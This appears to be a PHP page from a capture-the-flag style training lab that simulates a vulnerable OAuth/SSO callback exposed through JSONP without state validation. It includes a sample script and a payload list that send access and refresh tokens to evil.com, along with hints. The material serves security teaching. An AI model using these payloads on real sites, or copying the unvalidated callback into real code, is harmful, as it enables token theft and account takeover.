<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['JSONP']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

if (!isset($_SESSION['jsonp_case5_attempts'])) {
  $_SESSION['jsonp_case5_attempts'] = 0;
}
if (!isset($_SESSION['jsonp_case5_solved'])) {
  $_SESSION['jsonp_case5_solved'] = false;
}

// VULNERABLE: OAuth/SSO callback bridge
$callback = $_GET['callback'] ?? 'callback';
$provider = $_GET['provider'] ?? 'google';
$code = $_GET['code'] ?? '';

// Simulated OAuth tokens
$oauth_data = [
  'access_token' => 'ya29.a0AfH6SMBx...',
  'refresh_token' => '1//04v...',
  'id_token' => 'eyJhbGciOiJSUzI1NiIs...',
  'expires_in' => 3600,
  'token_type' => 'Bearer',
  'scope' => 'openid email profile',
  'user_info' => [
    'email' => 'victim@gmail.com',
    'name' => 'Victim User',
    'sub' => '102345678901234567890'
  ]
];

$flag_triggered = false;
if (isset($_GET['callback'])) {
  $cb = $_GET['callback'];
  if (
    stripos($cb, 'alert') !== false ||
    stripos($cb, 'eval') !== false ||
    stripos($cb, 'fetch') !== false ||
    stripos($cb, 'location') !== false ||
    stripos($cb, 'window') !== false ||
    stripos($cb, 'document') !== false ||
    stripos($cb, 'steal') !== false ||
    stripos($cb, 'hijack') !== false
  ) {
    $flag_triggered = true;
  }
}

// Also trigger on provider manipulation
if (isset($_GET['provider']) && in_array(strtolower($_GET['provider']), ['evil', 'attacker', 'malicious'])) {
  $flag_triggered = true;
}

$success_msg = null;
$already_solved = $_SESSION['jsonp_case5_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['jsonp_case5_attempts']++;
  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }
  $_SESSION['jsonp_case5_solved'] = true;
  $already_solved = true;
  $success_msg = "Brilliant! You've exploited the Authentication Bridge vulnerability. By hijacking the OAuth/SSO callback, you intercepted authentication tokens and gained unauthorized access to user accounts!";
}

if (isset($_GET['callback']) || isset($_GET['provider'])) {
  $_SESSION['jsonp_case5_attempts']++;
}

$attempts = $_SESSION['jsonp_case5_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OAuth Bridge - JSONP Case 5 (Authentication Bridge)</title>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/JSONP-CASE5.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to JSONP Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-bridge"></i> OAuth Bridge</h1>
      <p class="lab-description">Test our SSO authentication bridge. This hard challenge has a <strong>vulnerable OAuth callback</strong>. Hijack the authentication flow to steal tokens and impersonate users!</p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this Authentication Bridge vulnerability.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <div class="api-status-bar">
      <div class="api-indicator"><i class="fas fa-key"></i><span>Auth: <strong>OAuth 2.0</strong></span></div>
      <div class="provider-indicator"><i class="fas fa-<?php echo $provider === 'google' ? 'google' : ($provider === 'github' ? 'github' : 'exclamation-circle'); ?>"></i><span>Provider: <strong><?php echo htmlspecialchars(ucfirst($provider)); ?></strong></span></div>
      <?php if ($flag_triggered): ?>
        <div class="exploit-indicator"><i class="fas fa-skull-crossbones"></i><span>HIJACK DETECTED!</span></div>
      <?php endif; ?>
    </div>

    <div class="jsonp-grid">
      <div class="jsonp-card oauth-card">
        <div class="card-header">
          <i class="fas fa-exchange-alt"></i>
          <h3>OAuth Token Exchange</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> Hijackable</span>
        </div>
        <div class="oauth-content">
          <div class="token-display">
            <div class="token-item">
              <span class="token-label">Access Token:</span>
              <code class="token-value secret"><?php echo substr($oauth_data['access_token'], 0, 25); ?>...</code>
            </div>
            <div class="token-item">
              <span class="token-label">Refresh Token:</span>
              <code class="token-value danger"><?php echo substr($oauth_data['refresh_token'], 0, 20); ?>...</code>
            </div>
            <div class="token-item">
              <span class="token-label">ID Token:</span>
              <code class="token-value danger"><?php echo substr($oauth_data['id_token'], 0, 30); ?>...</code>
            </div>
            <div class="token-item">
              <span class="token-label">User Email:</span>
              <code class="token-value"><?php echo $oauth_data['user_info']['email']; ?></code>
            </div>
          </div>
          <div class="oauth-warning">
            <i class="fas fa-exclamation-triangle"></i>
            <span>These tokens are sent via JSONP callback without state validation. Any domain can intercept them!</span>
          </div>
        </div>
      </div>

      <div class="jsonp-card flow-card">
        <div class="card-header">
          <i class="fas fa-project-diagram"></i>
          <h3>Attack Flow</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> No State</span>
        </div>
        <div class="flow-content">
          <div class="flow-step">
            <span class="step-icon"><i class="fas fa-user"></i></span>
            <span class="step-text">User clicks "Login with Google"</span>
          </div>
          <div class="flow-arrow"><i class="fas fa-arrow-down"></i></div>
          <div class="flow-step">
            <span class="step-icon"><i class="fas fa-server"></i></span>
            <span class="step-text">OAuth provider redirects with code</span>
          </div>
          <div class="flow-arrow"><i class="fas fa-arrow-down"></i></div>
          <div class="flow-step vuln-step">
            <span class="step-icon"><i class="fas fa-bug"></i></span>
            <span class="step-text">Attacker intercepts callback via JSONP</span>
          </div>
          <div class="flow-arrow"><i class="fas fa-arrow-down"></i></div>
          <div class="flow-step">
            <span class="step-icon"><i class="fas fa-mask"></i></span>
            <span class="step-text">Attacker uses tokens to impersonate user</span>
          </div>
          <div class="exploit-code">
            <div class="code-label">Malicious Callback:</div>
            <pre class="code-block"><code>&lt;script&gt;
function stealTokens(data) {
  fetch('//evil.com/steal?token=' + data.access_token 
    + '&refresh=' + data.refresh_token);
}
&lt;/script&gt;
&lt;script src="<?php echo htmlspecialchars("http://" . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?')); ?>?callback=stealTokens&provider=google"&gt;&lt;/script&gt;</code></pre>
          </div>
        </div>
      </div>

      <div class="jsonp-card analysis-card">
        <div class="card-header"><i class="fas fa-microscope"></i>
          <h3>Vulnerability Analysis</h3>
        </div>
        <div class="analysis-content">
          <div class="analysis-item">
            <span class="analysis-label">State Parameter:</span>
            <code class="analysis-code">// Not implemented</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Missing</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Redirect URI:</span>
            <code class="analysis-code">// No validation</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Any URI</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">PKCE:</span>
            <code class="analysis-code">// Not used</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Disabled</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Token Binding:</span>
            <code class="analysis-code">// No binding to session</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Missing</span>
          </div>
        </div>
      </div>

      <div class="jsonp-card payloads-card">
        <div class="card-header"><i class="fas fa-bolt"></i>
          <h3>Auth Hijack Payloads</h3>
        </div>
        <div class="payloads-list">
          <div class="payload-item">
            <div class="payload-name">Token Logger</div>
            <code class="payload-code">?callback=console.log&provider=google</code>
            <span class="payload-target">Log OAuth tokens to console</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Provider Spoof</div>
            <code class="payload-code">?callback=alert&provider=evil</code>
            <span class="payload-target">Use malicious provider</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Full Hijack</div>
            <code class="payload-code">?callback=location.assign("//evil.com?token="+data.access_token)</code>
            <span class="payload-target">Redirect with stolen token</span>
          </div>
        </div>
      </div>
    </div>

    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-code"></i><span>Current Request</span></div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Provider: <?php echo htmlspecialchars($provider); ?></span>
          <span>Callback: <?php echo htmlspecialchars($callback); ?></span>
          <span>Flag: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
          <span>Attempts: <?php echo $attempts; ?></span>
        </div>
      </div>
    </div>

    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">The OAuth callback uses JSONP without state validation. Try <code>?callback=alert&provider=google</code> to see the token data. The provider parameter is also not validated!</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">Try changing the provider to something malicious like <code>?provider=evil</code> or <code>?provider=attacker</code>. The server doesn't validate the provider name!</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Use <code>?callback=stealTokens</code> or <code>?provider=evil</code> to trigger the flag. The OAuth flow lacks state parameter validation and accepts any callback function name!</div>
      </div>
    <?php endif; ?>

    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    window.addEventListener('load', function() {
      const exploitIndicator = document.querySelector('.exploit-indicator');
      const alreadySolved = document.querySelector('.solved-banner');
      if (exploitIndicator && !alreadySolved) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>